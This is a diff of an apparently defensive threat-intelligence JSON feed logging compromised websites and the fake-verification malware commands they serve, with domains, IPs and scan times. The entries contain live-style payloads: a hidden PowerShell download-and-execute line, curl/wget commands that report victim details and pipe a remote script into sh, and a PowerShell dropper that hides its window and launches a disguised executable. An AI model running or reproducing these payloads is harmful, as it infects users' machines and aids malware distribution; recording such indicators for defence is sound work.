@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "danieltschumi.com",
+    "DeliveryUrl": [
+      "simpludelicios.md"
+    ],
+    "PayloadUrl": [
+      "https://simpludelicios.md/vcapcha.ps1"
+    ],
+    "IP": [
+      "149.126.4.94"
+    ],
+    "Related": [],
+    "Payload": "powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('https://simpludelicios[.]md/vcapcha.ps1'))\"",
+    "ResolvedDownloadUrl": [
+      "https://simpludelicios.md/vcapcha.ps1"
+    ],
+    "ReportId": "cmwoed01h1z340oml4kvksqv8",
+    "ScannedAt": "2026-11-20T03:05:54.133000+00:00"
+  },
+  {
     "UrlDomain": "i-mill.net",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -9288,172 +9307,5 @@
     ],
     "ReportId": "cmwha6n200r0k0oml79vcxbid",
     "ScannedAt": "2026-11-15T03:34:35.644000+00:00"
-  },
-  {
-    "UrlDomain": "faizertraders.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "91.108.101.102"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=8483c18e-0d34-477d-a69f-39c2685acc7d&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Ffaizertraders[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A27%3A30.836Z&lastShellAt=2026-11-15T03%3A27%3A30.836Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwh9zbji0qsf0omly5l7mevq",
-    "ScannedAt": "2026-11-15T03:28:54.109000+00:00"
-  },
-  {
-    "UrlDomain": "achadinhosofertas.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "162.241.203.86"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=472a1878-340d-4637-a873-0423fb4293af&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fachadinhosofertas[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A24%3A22.196Z&lastShellAt=2026-11-15T03%3A24%3A22.196Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwh9v9pi0qrl0omlv4pbinuy",
-    "ScannedAt": "2026-11-15T03:25:45.167000+00:00"
-  },
-  {
-    "UrlDomain": "desrecettesfaciles.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "77.37.83.23"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=9559fe19-51b4-4fcc-9d02-2400bae2d826&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fdesrecettesfaciles[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A22%3A23.142Z&lastShellAt=2026-11-15T03%3A22%3A23.142Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwh9sq3h0qmz0omla5uwnjm3",
-    "ScannedAt": "2026-11-15T03:23:46.316000+00:00"
-  },
-  {
-    "UrlDomain": "martinworster.co.uk",
-    "DeliveryUrl": [
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "188.114.96.0"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwh9nuke0qe30oml6tbk0se8",
-    "ScannedAt": "2026-11-15T03:19:58.891000+00:00"
-  },
-  {
-    "UrlDomain": "maltepe-haber.xyz",
-    "DeliveryUrl": [
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [
-      {
-        "Value": "https://frclau.com/ca.js",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwh9nozg0qd60oml0fnpuhy7",
-    "ScannedAt": "2026-11-15T03:19:51.677000+00:00"
-  },
-  {
-    "UrlDomain": "kayapinar-haber.com.tr",
-    "DeliveryUrl": [
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "104.21.21.246"
-    ],
-    "Related": [
-      {
-        "Value": "https://frclau.com/ca.js",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwh9nfu30qce0oml74xfn289",
-    "ScannedAt": "2026-11-15T03:19:39.750000+00:00"
-  },
-  {
-    "UrlDomain": "bananaexcursions.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "145.14.156.49"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=c0fc2b25-8ccf-4875-ab44-fb9ceb7ad2c3&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbananaexcursions[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A09%3A49.351Z&lastShellAt=2026-11-15T03%3A09%3A49.351Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwh9cl1t0pv80omltzym1oqw",
-    "ScannedAt": "2026-11-15T03:11:13.345000+00:00"
   }
 ]
